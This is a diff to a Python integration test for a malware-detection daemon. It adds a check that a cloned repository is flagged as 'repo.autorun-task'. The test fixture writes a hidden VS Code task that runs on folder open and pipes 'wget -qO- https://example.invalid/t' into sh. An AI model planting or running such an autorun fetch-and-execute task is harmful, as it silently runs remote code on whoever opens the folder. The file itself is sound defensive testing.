@@ -6,6 +6,7 @@ private HOME, and no service manager. Usage: daemon_integration.py target/debug"
 import json
 import os
 from pathlib import Path
+import shutil
 import socket
 import subprocess
 import sys
@@ -19,6 +20,8 @@ with tempfile.TemporaryDirectory(prefix='bigman-daemon-', dir=runtime) as work:
     home = root / 'home'
     downloads = home / 'Downloads'
     downloads.mkdir(parents=True)
+    projects = home / 'Projects'
+    projects.mkdir()
     tools = root / 'tools'
     tools.mkdir()
     sock = root / 'run' / 'bigmand.sock'
@@ -221,7 +224,28 @@ sys.exit(1 if detected else 0)
         posted = [e for e in download_events() if 'Invoice.pdf.desktop' in e['summary']]
         assert len(posted) == 1 and posted[0]['severity'] == 'high' and posted[0]['rule'] == 'desktop.masquerade', posted
         assert not any('Invoice.pdf.desktop' in e['summary'] for e in scan_events()), 'the download also entered as a report'
-        print('PASS: scan, previewed quarantine and restore, nonexecuting inspection, package policy, reviewed baseline, verified canary, history, timeline, live push, unread, receipt preview, Downloads watch and CLI over the daemon socket')
+        # The project watch: a take-home cloned into ~/Projects is checked once git
+        # finishes, and posted as a project. A real clone, of a local repository.
+        git = shutil.which('git')
+        if git:
+            lure = root / 'lure'
+            (lure / '.vscode').mkdir(parents=True)
+            (lure / '.vscode' / 'tasks.json').write_text('{"tasks":[{"label":"setup","command":"wget -qO- https://example.invalid/t | sh","presentation":{"reveal":"never"},"runOptions":{"runOn":"folderOpen"}}]}')
+            git_env = dict(os.environ, GIT_CONFIG_GLOBAL='/dev/null', GIT_CONFIG_NOSYSTEM='1')
+            for args in (['init', '-q', '-b', 'main'], ['add', '.'], ['-c', 'user.name=t', '-c', 'user.email=t@t.invalid', 'commit', '-qm', 'x']):
+                subprocess.run([git, *args], cwd=lure, env=git_env, check=True)
+            subprocess.run([git, 'clone', '-q', str(lure), str(projects / 'take-home')], env=git_env, check=True)
+            def project_events():
+                return value({'type': 'events', 'since': 0, 'until': None, 'sources': ['project'], 'limit': 100}, 'events')
+            deadline = time.monotonic() + 40
+            while not project_events():
+                assert time.monotonic() < deadline, 'the project watch did not post the clone'
+                time.sleep(0.25)
+            posted = project_events()
+            assert len(posted) == 1 and posted[0]['severity'] == 'high' and posted[0]['rule'] == 'repo.autorun-task', posted
+            assert 'take-home' in posted[0]['summary'], posted
+            assert not any('take-home' in e['summary'] for e in scan_events()), 'the project also entered as a report'
+        print('PASS: scan, previewed quarantine and restore, nonexecuting inspection, package policy, reviewed baseline, verified canary, history, timeline, live push, unread, receipt preview, Downloads and project watches and CLI over the daemon socket')
     finally:
         daemon.terminate()
         daemon.wait(timeout=10)
